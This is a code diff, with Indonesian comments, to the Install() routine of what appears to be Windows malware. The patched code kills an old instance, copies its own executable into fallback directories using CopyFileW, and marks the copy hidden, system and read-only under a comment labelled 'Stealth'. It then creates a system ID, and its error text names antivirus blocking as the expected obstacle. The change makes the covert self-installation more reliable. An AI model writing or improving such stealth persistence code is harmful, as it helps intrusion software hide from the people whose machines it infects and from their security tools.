@@ -182,27 +182,43 @@ void Install() {
     TerminateOldProcess();
 
     for (const auto& targetDir : fallbackPaths) {
-        if (!std::filesystem::exists(targetDir)) { std::filesystem::create_directories(targetDir, ec); }
+        std::error_code ec;
+        // 1. Pastikan direktori dibuat
+        if (!std::filesystem::exists(targetDir)) { 
+            std::filesystem::create_directories(targetDir, ec); 
+        }
+
         std::filesystem::path targetExe = targetDir / Config::EXE_NAME;
+
+        // 2. Bersihkan file lama jika ada
         if (std::filesystem::exists(targetExe)) {
             SetFileAttributesW(targetExe.wstring().c_str(), FILE_ATTRIBUTE_NORMAL);
             std::filesystem::remove(targetExe, ec);
         }
-        if (std::filesystem::copy_file(myPath, targetExe, std::filesystem::copy_options::overwrite_existing, ec)) {
-            if (std::filesystem::file_size(targetExe) > 0) {
+
+        // 3. Gunakan CopyFileW (WinAPI) alih-alih std::filesystem untuk reliabilitas
+        if (CopyFileW(myPath.wstring().c_str(), targetExe.wstring().c_str(), FALSE)) {
+            // Verifikasi apakah file benar-benar ada dan tidak 0-byte
+            if (std::filesystem::exists(targetExe) && std::filesystem::file_size(targetExe) > 0) {
                 finalExePath = targetExe;
                 copySuccess = true;
                 break; 
             }
+        } else {
+            // Debug: Ambil kode error jika gagal
+            DWORD error = GetLastError();
+            std::wcerr << L"Gagal menyalin ke " << targetDir.wstring() << L" (Error: " << error << L")" << std::endl;
         }
     }
 
     if (!copySuccess) {
-        std::wcerr << L"Gagal menyalin file sistem. Jalankan sebagai Administrator.\n";
-        Sleep(3000);
+        std::wcerr << L"\n[ERROR] Gagal menyalin file sistem ke lokasi mana pun.\n";
+        std::wcerr << L"Penyebab umum: Antivirus memblokir atau kurang hak Administrator.\n";
+        Sleep(5000); // Beri waktu lebih lama agar user bisa baca error
         return;
     }
 
+    // 4. Set atribut Stealth (Hidden + System + ReadOnly)
     SetFileAttributesW(finalExePath.wstring().c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);
 
     // Buat System ID unik
